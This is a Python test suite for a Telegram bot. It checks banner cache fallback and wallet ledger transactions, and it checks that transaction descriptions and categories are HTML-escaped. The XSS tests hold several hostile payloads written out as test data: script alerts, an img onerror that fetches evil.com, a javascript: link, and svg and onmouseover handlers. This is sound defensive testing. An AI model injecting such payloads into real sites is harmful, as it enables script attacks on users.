# -*- coding: utf-8 -*-
"""
tests/test_adversarial_banner_and_wallet_challenger2.py
========================================================
Adversarial Stress Test Suite for:
1. Banner MediaGroup Robustness & Telegram CDN Cache Fallback (R2)
2. Wallet Ledger Financial Transaction Integrity & HTML Safety (R3)

Written by Challenger 2 (Empirical Adversarial Verification).
"""

import os
import sys
import json
import math
import time
import asyncio
import tempfile
import unittest
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

import aiosqlite
from aiogram import types, Bot
from aiogram.types import FSInputFile, InputMediaPhoto, InlineKeyboardMarkup
from aiogram.exceptions import TelegramBadRequest, TelegramAPIError
from aiogram.methods import SendMediaGroup

import banner_manager
from banner_manager import (
    get_banner_file,
    get_all_banners_summary,
    save_cache,
    _init_banners,
    BANNERS_DIR,
    CACHE_FILE,
)
from main import (
    _send_banners_page,
    _format_ledger_view,
    cmd_wallet,
    cmd_ledger,
    cb_prof_ledger,
    BANNERS_PER_PAGE,
)
import common.database
from common.database import (
    record_user_transaction,
    get_user_recent_transactions,
    get_user_transaction_summary,
    get_user_global_balance,
    db_lock,
)
from common.html_utils import escape_html


class TestBannerMediaGroupAdversarial(unittest.IsolatedAsyncioTestCase):
    """Adversarial stress tests for Banner MediaGroup CDN cache fallback & resilience (R2)."""

    async def asyncSetUp(self):
        self._orig_cache = banner_manager._BANNER_CACHE.copy()
        self._orig_categorized = {k: list(v) for k, v in banner_manager._CATEGORIZED_BANNERS.items()}
        self._orig_decks = {k: deque_copy.copy() for k, deque_copy in banner_manager._CATEGORY_DECKS.items()}

    async def asyncTearDown(self):
        banner_manager._BANNER_CACHE.clear()
        banner_manager._BANNER_CACHE.update(self._orig_cache)
        banner_manager._CATEGORIZED_BANNERS.clear()
        banner_manager._CATEGORIZED_BANNERS.update(self._orig_categorized)
        banner_manager._CATEGORY_DECKS.clear()
        banner_manager._CATEGORY_DECKS.update(self._orig_decks)

    async def test_intermittent_bad_request_chunk_eviction_and_retry(self):
        """Simulate TelegramBadRequest('wrong remote file identifier') on initial media group send."""
        bot = AsyncMock(spec=Bot)
        bot.id = 999111
        chat_id = 777888999

        all_pool = banner_manager._CATEGORIZED_BANNERS.get("all", [])
        self.assertGreater(len(all_pool), 0)
        chunk = all_pool[:BANNERS_PER_PAGE]

        # Seed cache with corrupted/expired file_ids directly into active cache
        for fn in chunk:
            banner_manager._BANNER_CACHE[f"{bot.id}:{fn}"] = f"corrupted_fid_{fn}"
            banner_manager._BANNER_CACHE[fn] = f"corrupted_fid_{fn}"

        # Mock second (fallback) send to succeed with fresh file_ids
        sent_messages = []
        for idx, fn in enumerate(chunk):
            msg = MagicMock(spec=types.Message)
            photo_size = MagicMock(spec=types.PhotoSize)
            photo_size.file_id = f"fresh_cdn_fid_{idx}"
            msg.photo = [photo_size]
            sent_messages.append(msg)

        bad_req = TelegramBadRequest(
            method=SendMediaGroup(chat_id=chat_id, media=[]),
            message="Bad Request: wrong remote file identifier specified"
        )
        bot.send_media_group.side_effect = [bad_req, sent_messages]

        with patch("banner_manager.save_cache") as mock_save:
            await _send_banners_page(bot, chat_id=chat_id, page=0, category="all")

        # 1. Verify send_media_group was attempted twice
        self.assertEqual(bot.send_media_group.call_count, 2)

        # 2. First attempt sent string file_ids
        first_media = bot.send_media_group.call_args_list[0].kwargs["media"]
        for item in first_media:
            self.assertIsInstance(item.media, str)
            self.assertTrue(item.media.startswith("corrupted_fid_"))

        # 3. Fallback attempt sent FSInputFile local objects
        fallback_media = bot.send_media_group.call_args_list[1].kwargs["media"]
        for item in fallback_media:
            self.assertIsInstance(item.media, FSInputFile)

        # 4. Old corrupted keys were wiped and replaced with fresh CDN IDs
        for idx, fn in enumerate(chunk):
            self.assertEqual(banner_manager._BANNER_CACHE[f"{bot.id}:{fn}"], f"fresh_cdn_fid_{idx}")
            self.assertEqual(banner_manager._BANNER_CACHE[fn], f"fresh_cdn_fid_{idx}")

        # 5. Save cache was called atomically
        self.assertGreaterEqual(mock_save.call_count, 2)

        # 6. Navigation message was sent with markup
        bot.send_message.assert_called_once()
        self.assertIn("reply_markup", bot.send_message.call_args.kwargs)

    async def test_random_bad_request_across_multiple_categories(self):
        """Stress-test cache invalidation and local fallback across diverse category pools."""
        bot = AsyncMock(spec=Bot)
        bot.id = 123456
        chat_id = 987654

        categories_to_test = ["shop", "wallet", "roulette", "night", "maid", "schizo", "cyberpunk"]
        for cat in categories_to_test:
            pool = banner_manager._CATEGORIZED_BANNERS.get(cat, [])
            if not pool:
                continue
            chunk = pool[:BANNERS_PER_PAGE]

            # Poison cache
            for fn in chunk:
                banner_manager._BANNER_CACHE[f"{bot.id}:{fn}"] = f"bad_id_{cat}_{fn}"
                banner_manager._BANNER_CACHE[fn] = f"bad_id_{cat}_{fn}"

            sent_msgs = []
            for idx, fn in enumerate(chunk):
                m = MagicMock(spec=types.Message)
                ps = MagicMock(spec=types.PhotoSize)
                ps.file_id = f"repaired_fid_{cat}_{idx}"
                m.photo = [ps]
                sent_msgs.append(m)

            bot.reset_mock()
            bot.send_media_group.side_effect = [
                TelegramBadRequest(
                    method=SendMediaGroup(chat_id=chat_id, media=[]),
                    message="Bad Request: wrong remote file identifier specified"
                ),
                sent_msgs
            ]

            await _send_banners_page(bot, chat_id=chat_id, page=0, category=cat)

            self.assertEqual(bot.send_media_group.call_count, 2)
            # Ensure fresh IDs were stored
            for idx, fn in enumerate(chunk):
                self.assertEqual(banner_manager._BANNER_CACHE[f"{bot.id}:{fn}"], f"repaired_fid_{cat}_{idx}")

    async def test_both_initial_and_fallback_fail_resilience(self):
        """When both CDN file_ids and local file uploads fail, bot must not crash and must notify user."""
        bot = AsyncMock(spec=Bot)
        bot.id = 555444
        chat_id = 111222

        bot.send_media_group.side_effect = [
            TelegramBadRequest(
                method=SendMediaGroup(chat_id=chat_id, media=[]),
                message="Bad Request: wrong remote file identifier specified"
            ),
            TelegramAPIError(
                method=SendMediaGroup(chat_id=chat_id, media=[]),
                message="Telegram network timeout"
            )
        ]

        await _send_banners_page(bot, chat_id=chat_id, page=0, category="all")

        self.assertEqual(bot.send_media_group.call_count, 2)
        bot.send_message.assert_called_once()
        msg_text = bot.send_message.call_args.args[1] if len(bot.send_message.call_args.args) > 1 else bot.send_message.call_args.kwargs.get("text", "")
        self.assertIn("❌ Ошибка отправки баннеров", msg_text)

    async def test_corrupted_banner_cache_files_on_disk(self):
        """Test resilience against corrupted, truncated, and empty banner cache JSON files."""
        with tempfile.TemporaryDirectory() as tmpdir:
            test_cache_path = Path(tmpdir) / "banners_cache.json"

            with patch("banner_manager.CACHE_FILE", test_cache_path):
                # 1. Truncated JSON
                with open(test_cache_path, "w", encoding="utf-8") as f:
                    f.write('{"valid_banner.jpg": "fid_123", "corrupted_banner.jpg": ')

                _init_banners()
                self.assertIsInstance(banner_manager._BANNER_CACHE, dict)

                # 2. Binary garbage
                with open(test_cache_path, "wb") as f:
                    f.write(os.urandom(256))

                _init_banners()
                self.assertIsInstance(banner_manager._BANNER_CACHE, dict)

                # 3. Empty file (0 bytes)
                with open(test_cache_path, "w", encoding="utf-8") as f:
                    f.write("")

                _init_banners()
                self.assertIsInstance(banner_manager._BANNER_CACHE, dict)

    async def test_corrupted_banner_cache_non_dict_json(self):
        """Test behavior when banners_cache.json contains non-dict JSON (array, int, null, string)."""
        with tempfile.TemporaryDirectory() as tmpdir:
            test_cache_path = Path(tmpdir) / "banners_cache.json"

            with patch("banner_manager.CACHE_FILE", test_cache_path):
                # JSON array instead of dict
                with open(test_cache_path, "w", encoding="utf-8") as f:
                    f.write('["corrupted_array_item_1", "corrupted_array_item_2"]')

                _init_banners()
                # _BANNER_CACHE must remain a safe dict (not list)
                self.assertIsInstance(banner_manager._BANNER_CACHE, dict)
                self.assertEqual(len(banner_manager._BANNER_CACHE), 0)

    async def test_atomic_cache_save_and_recovery(self):
        """Verify save_cache writes atomically without leaving corrupt temp files."""
        with tempfile.TemporaryDirectory() as tmpdir:
            test_cache_path = Path(tmpdir) / "banners_cache.json"
            tmp_file = test_cache_path.with_suffix(".tmp")

            with patch("banner_manager.CACHE_FILE", test_cache_path):
                banner_manager._BANNER_CACHE["test_banner.jpg"] = "test_fid_999"
                save_cache()

                self.assertTrue(test_cache_path.exists())
                self.assertFalse(tmp_file.exists(), "Temp file should be renamed/replaced atomically")

                with open(test_cache_path, "r", encoding="utf-8") as f:
                    loaded = json.load(f)
                self.assertEqual(loaded.get("test_banner.jpg"), "test_fid_999")

    async def test_save_cache_os_error_resilience(self):
        """save_cache must handle filesystem write errors without raising uncaught exceptions."""
        with patch("banner_manager.open", side_effect=PermissionError("Disk write denied")):
            try:
                save_cache()
            except Exception as exc:
                self.fail(f"save_cache raised an unhandled exception: {exc}")


class TestWalletLedgerAdversarial(unittest.IsolatedAsyncioTestCase):
    """Adversarial stress tests for Wallet Ledger Financial Transaction Integrity & HTML Safety (R3)."""

    async def asyncSetUp(self):
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.db_path = Path(self.tmp_dir.name) / "test_ledger.db"

        # Initialize SQLite database with real schema
        self.db = await aiosqlite.connect(str(self.db_path), timeout=30.0, isolation_level=None)
        await self.db.execute("PRAGMA busy_timeout = 30000;")
        await self.db.execute("PRAGMA journal_mode=WAL;")
        await self.db.execute("BEGIN IMMEDIATE")
        await common.database._create_tables(self.db)
        await common.database._apply_migrations(self.db)
        await common.database._create_indices(self.db)
        await self.db.execute("COMMIT")

    async def asyncTearDown(self):
        await self.db.close()
        self.tmp_dir.cleanup()

    async def test_concurrent_insertions_high_volume(self):
        """Stress-test 100 concurrent async transactions into UserTransactions with strict arithmetic verification."""
        user_id = 998877
        num_workers = 100
        amounts = [float(i * 10 if i % 2 == 0 else -(i * 5)) for i in range(1, num_workers + 1)]

        async def worker(idx, amt):
            cat = "casino" if amt > 0 else "shop"
            desc = f"Concurrent tx #{idx} amt={amt}"
            res = await record_user_transaction(self.db, user_id, amt, cat, desc)
            return res

        tasks = [worker(i, amounts[i]) for i in range(num_workers)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # 1. Verify all transactions succeeded and returned integer lastrowids
        for r in results:
            self.assertIsInstance(r, int, f"Worker failed with: {r}")

        # 2. Verify summary calculations against exact expected sums
        expected_earned = sum(a for a in amounts if a > 0)
        expected_spent = sum(abs(a) for a in amounts if a < 0)
        expected_total_ops = num_workers

        summary = await get_user_transaction_summary(self.db, user_id)
        self.assertAlmostEqual(summary["total_earned"], expected_earned, places=2)
        self.assertAlmostEqual(summary["total_spent"], expected_spent, places=2)
        self.assertEqual(summary["total_ops"], expected_total_ops)

        # 3. Verify recent transactions ordering
        recent = await get_user_recent_transactions(self.db, user_id, limit=20)
        self.assertEqual(len(recent), 20)
        # IDs must be in strictly descending order
        ids = [tx["id"] for tx in recent]
        self.assertEqual(ids, sorted(ids, reverse=True))

    async def test_record_user_transaction_boundary_and_malformed_inputs(self):
        """Adversarial testing of input sanitization in record_user_transaction."""
        user_id = 112233

        # 1. Zero amount must be rejected
        self.assertIsNone(await record_user_transaction(self.db, user_id, 0, "shop", "zero"))
        self.assertIsNone(await record_user_transaction(self.db, user_id, 0.0, "shop", "zero float"))

        # 2. NaN / Inf must be rejected
        self.assertIsNone(await record_user_transaction(self.db, user_id, float("nan"), "shop", "nan"))
        self.assertIsNone(await record_user_transaction(self.db, user_id, float("inf"), "shop", "inf"))
        self.assertIsNone(await record_user_transaction(self.db, user_id, float("-inf"), "shop", "-inf"))

        # 3. Non-numeric amounts must be rejected
        self.assertIsNone(await record_user_transaction(self.db, user_id, "100", "shop", "string amt"))
        self.assertIsNone(await record_user_transaction(self.db, user_id, None, "shop", "none amt"))

        # 4. Long descriptions (>255 chars) must be safely truncated
        long_desc = "X" * 1000
        tx_id = await record_user_transaction(self.db, user_id, 50.0, "work", long_desc)
        self.assertIsNotNone(tx_id)

        txs = await get_user_recent_transactions(self.db, user_id, limit=1)
        self.assertEqual(len(txs), 1)
        self.assertEqual(len(txs[0]["description"]), 255)

        # 5. Empty/None category defaults to 'other'
        tx_id2 = await record_user_transaction(self.db, user_id, -20.0, None, "default cat test")
        self.assertIsNotNone(tx_id2)
        txs2 = await get_user_recent_transactions(self.db, user_id, limit=1)
        self.assertEqual(txs2[0]["category"], "other")

    async def test_cmd_wallet_html_escaping_and_xss_immunity(self):
        """Verify cmd_wallet escapes malicious script tags and entities in transaction descriptions."""
        user_id = 445566
        board_id = "b"

        # Seed user in DB
        await self.db.execute(
            "INSERT INTO Users (user_id, board_id, balance, is_verified_b) VALUES (?, ?, ?, 1)",
            (user_id, board_id, 500.0)
        )
        await self.db.commit()

        # Seed 4 malicious transactions (within limit=4)
        xss_payloads = [
            "<script>alert('pwned')</script>",
            "<img src=x onerror=fetch('http://evil.com')>",
            "<b>bold unclosed",
            "<a href='javascript:void(0)'>click</a>",
        ]
        for p in xss_payloads:
            await record_user_transaction(self.db, user_id, 10.0, "work", p)

        mock_msg = MagicMock(spec=types.Message)
        mock_msg.from_user = MagicMock(spec=types.User)
        mock_msg.from_user.id = user_id
        mock_msg.chat = MagicMock(spec=types.Chat)
        mock_msg.chat.id = user_id
        mock_bot = AsyncMock(spec=Bot)
        mock_bot_user = MagicMock()
        mock_bot_user.username = "test_bot"
        mock_bot.get_me.return_value = mock_bot_user
        mock_msg.bot = mock_bot

        with patch("main.get_pool", return_value=self.db), \
             patch("common.database.get_pool", return_value=self.db), \
             patch("banner_manager.send_banner_message") as mock_banner_send:

            await cmd_wallet(mock_msg, board_id=board_id, stream="ru")

            # Extract rendered caption / text
            mock_banner_send.assert_called_once()
            caption = mock_banner_send.call_args.kwargs.get("caption", "")

            # Verify that NO raw HTML script, img, or a tags exist in caption
            self.assertNotIn("<script>", caption)
            self.assertNotIn("<img", caption)
            self.assertNotIn("<a href='javascript", caption)
            self.assertIn("&lt;script&gt;", caption)
            self.assertIn("&lt;img", caption)
            self.assertIn("&lt;a href='javascript", caption)

    async def test_format_ledger_view_html_safety_and_pagination(self):
        """Verify _format_ledger_view handles XSS injection and pagination accurately."""
        user_id = 889900
        balance = 12500.0

        transactions = [
            {
                "id": 1,
                "user_id": user_id,
                "amount": 1000.0,
                "category": "work",
                "description": "<script>alert('work_xss')</script>",
                "timestamp": int(time.time())
            },
            {
                "id": 2,
                "user_id": user_id,
                "amount": -500.0,
                "category": "shop",
                "description": "<b onmouseover=evil()>Malicious Shop Item</b>",
                "timestamp": int(time.time()) - 100
            },
            {
                "id": 3,
                "user_id": user_id,
                "amount": 250.0,
                "category": "other",
                "description": "Clean description with <tags>",
                "timestamp": int(time.time()) - 200
            }
        ]

        summary = {
            "total_earned": 1250.0,
            "total_spent": 500.0,
            "total_ops": 35
        }

        # Page 1 (offset=0)
        text, kb = _format_ledger_view(user_id, balance, transactions, summary, offset=0)

        # 1. Text checks
        self.assertNotIn("<script>", text)
        self.assertNotIn("<b onmouseover", text)
        self.assertIn("&lt;script&gt;", text)
        self.assertIn("&lt;b onmouseover", text)
        self.assertIn("ВЫПИСКА И ИСТОРИЯ ОПЕРАЦИЙ", text)
        self.assertIn("12,500 ₪", text)

        # 2. Keyboard pagination checks
        self.assertIsInstance(kb, InlineKeyboardMarkup)
        btn_texts = [btn.text for row in kb.inline_keyboard for btn in row]
        self.assertTrue(any("Стр. 1/4" in t for t in btn_texts), f"Expected 'Стр. 1/4' in {btn_texts}")
        self.assertTrue(any("Вперед ▶️" in t for t in btn_texts))
        # First page should not have "Назад"
        self.assertFalse(any("◀️ Назад" in t for t in btn_texts))

        # Page 2 (offset=10)
        text2, kb2 = _format_ledger_view(user_id, balance, transactions, summary, offset=10)
        btn_texts2 = [btn.text for row in kb2.inline_keyboard for btn in row]
        self.assertTrue(any("Стр. 2/4" in t for t in btn_texts2))
        self.assertTrue(any("◀️ Назад" in t for t in btn_texts2))
        self.assertTrue(any("Вперед ▶️" in t for t in btn_texts2))

    async def test_format_ledger_view_unescaped_category_vulnerability(self):
        """Adversarial check: Verify whether unknown categories with HTML tags leak raw unescaped HTML."""
        user_id = 991122
        balance = 100.0
        malicious_category = "<svg onload=alert(1)>"
        transactions = [
            {
                "id": 1,
                "user_id": user_id,
                "amount": 50.0,
                "category": malicious_category,
                "description": "Transaction with injected category",
                "timestamp": int(time.time())
            }
        ]
        summary = {"total_earned": 50.0, "total_spent": 0.0, "total_ops": 1}
        text, _ = _format_ledger_view(user_id, balance, transactions, summary)

        # Raw HTML tags in category must never appear unescaped in output HTML
        self.assertNotIn("<svg", text)
        self.assertNotIn("<SVG", text)
        self.assertIn("&lt;SVG ONLOAD=ALERT(1)&gt;", text)

    async def test_cmd_ledger_empty_and_populated_rendering(self):
        """Verify cmd_ledger end-to-end execution on populated and empty ledgers."""
        user_id = 334455
        board_id = "b"

        mock_msg = MagicMock(spec=types.Message)
        mock_msg.from_user = MagicMock(spec=types.User)
        mock_msg.from_user.id = user_id
        mock_msg.chat = MagicMock(spec=types.Chat)
        mock_msg.chat.id = user_id
        mock_msg.bot = AsyncMock(spec=Bot)

        # Test Empty Ledger
        with patch("main.get_pool", return_value=self.db), \
             patch("banner_manager.send_banner_message") as mock_banner_send:

            await cmd_ledger(mock_msg, board_id=board_id, stream="ru")
            mock_banner_send.assert_called_once()
            caption = mock_banner_send.call_args.kwargs.get("caption", "")
            self.assertIn("История операций пока пуста", caption)

        # Test Populated Ledger
        await record_user_transaction(self.db, user_id, 300.0, "work", "Заводская смена")
        await record_user_transaction(self.db, user_id, -100.0, "shop", "Купил доширак")

        mock_banner_send.reset_mock()
        with patch("main.get_pool", return_value=self.db), \
             patch("banner_manager.send_banner_message") as mock_banner_send:

            await cmd_ledger(mock_msg, board_id=board_id, stream="ru")
            mock_banner_send.assert_called_once()
            caption = mock_banner_send.call_args.kwargs.get("caption", "")
            self.assertIn("Заводская смена", caption)
            self.assertIn("Купил доширак", caption)
            self.assertIn("🟢 <b>+300 ₪</b>", caption)
            self.assertIn("🔴 <b>-100 ₪</b>", caption)


if __name__ == "__main__":
    unittest.main()
